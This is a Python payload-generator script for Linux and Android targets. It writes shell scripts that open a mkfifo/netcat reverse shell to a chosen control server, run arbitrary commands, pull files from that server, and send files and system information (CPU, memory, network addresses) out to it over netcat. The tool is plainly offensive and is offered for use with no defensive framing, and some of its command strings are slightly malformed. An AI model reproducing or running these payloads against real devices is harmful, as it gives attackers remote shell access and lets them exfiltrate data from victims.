#!/usr/bin/python3

import argparse
import os

arg_parser = argparse.ArgumentParser(description="Generate some payloads")
arg_parser.add_argument("-r", action="store_true",
    help="Create a reverse shell")
arg_parser.add_argument("-i", action="store", 
    help="Control server IP address")
arg_parser.add_argument("-p", action="store",
    help="Control server port", default=8888)
arg_parser.add_argument("-o", action="store", default="payload",
    help="Output file")
arg_parser.add_argument("-d", action="store_true",
    help="Download file")
arg_parser.add_argument("-u", action="store_true",
    help="Upload file")
arg_parser.add_argument("-z", action="store_true",
    help="Get system information")
arg_parser.add_argument("-a", default="x86",
    help="architecture: x86|arm")
arg_parser.add_argument("-c", default="",
    help="command to execute on target")
arg_parser.add_argument("-m", default="linux",
    help="Machine type: linux|android")
arg_parser.add_argument("--ndk", help="Path to NDK")
arg_parser.add_argument("--gcc", default="gcc",
    help="Path to GCC (Overridden if NDK is supplied)")  
arg_parser.add_argument("sources", nargs="?")
args = arg_parser.parse_args()

def write_payload(payload):
    f = open(args.o, "w")
    f.write(payload + "\n")
    f.close()
    os.chmod(args.o, int('777', base=8))

def reverse_shell():
    shellcode = 'set +e\n'
    if args.m == "linux":
        shellcode = shellcode + "rm -f /tmp/f; mkfifo /tmp/f\n"''
        shellcode = shellcode + "cat /tmp/f | /bin/sh -i 2>&1 | " + "nc " + str(args.i) + " " + str(args.p) + " > /tmp/f\n"
    elif args.m == "android":
        shellcode = shellcode + "rm -f /data/local/tmp/f; mkfifo /data/local/tmp/f\n"''
        shellcode = shellcode + "cat /data/local/tmp/f | /bin/sh -i 2>&1 | " + "toybox nc " + str(args.i) + " " + str(args.p) + " > /data/local/tmp/f" + " > /data/local/tmp/f\n"
    else:
        print("Invalid machine type")
        return
    write_payload(shellcode)

def command():
    shellcode = "sh -c '" + args.c +"'\n"
    write_payload(shellcode)

def download():
    if args.m == "linux":
        shellcode = "nc " + args.i + " " + args.p + " > " + args.sources + "\n"
    elif args.m == "android":
       shellcode = "toybox nc " + args.i + " " + args.p + " > " + args.sources + "\n" 
    write_payload(shellcode)
def upload():
    if args.m == "linux":
        shellcode = "nc -w 3" + args.i + " " + args.p + " < " + args.sources + "\n"
    elif args.m == "android":
       shellcode = "toybox nc -w 3 " + args.i + " " + args.p + " < " + args.sources + "\n" 
    write_payload(shellcode)
def system_info():
    shellcode = ''
    if args.m == "linux":
        shellcode = "(cat /proc/cpuinfo && cat /proc/meminfo && ip a) | nc -w 3 " + args.i + " " + args.p + "\n"
    elif args.m == "android":
       shellcode = "(cat /proc/cpuinfo && cat /proc/meminfo && ip a) | toybox nc -w 3 " + args.i + " " + args.p + "\n" 
    write_payload(shellcode)

if args.r:
    reverse_shell()
elif args.c != "":
    command()
elif args.d:
    download()
elif args.u:
    upload()
elif args.z:
    system_info()